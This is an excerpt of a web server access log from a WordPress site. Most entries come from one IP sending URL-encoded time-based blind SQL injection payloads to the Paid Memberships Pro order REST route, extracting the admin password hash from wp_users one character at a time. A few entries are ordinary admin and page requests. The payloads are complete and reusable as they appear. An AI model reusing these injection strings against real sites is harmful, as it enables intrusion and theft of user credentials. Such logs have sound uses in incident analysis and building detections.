47.53.122.78 - - [05/Sep/2023:02:55:38 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E49%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:41 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%21%3D50%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:41 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E47%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E87%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E67%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E77%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:55:47 +0000] "GET / HTTP/1.1" 200 11605 "http://www.sipress.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:55:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:55:49 +0000] "GET /wp-admin/about.php HTTP/1.1" 200 14614 "http://www.sipress.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:55:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E72%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:55:51 +0000] "GET / HTTP/1.1" 200 11826 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:55:50 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E74%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:55:55 +0000] "GET /index.php/sample-page/ HTTP/1.1" 200 11599 "http://www.sipress.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:55:55 +0000] "GET / HTTP/1.1" 200 10405 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:55:55 +0000] "GET / HTTP/1.1" 200 10405 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:55:53 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E75%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:55:57 +0000] "GET / HTTP/1.1" 200 10405 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:55:56 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E76%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
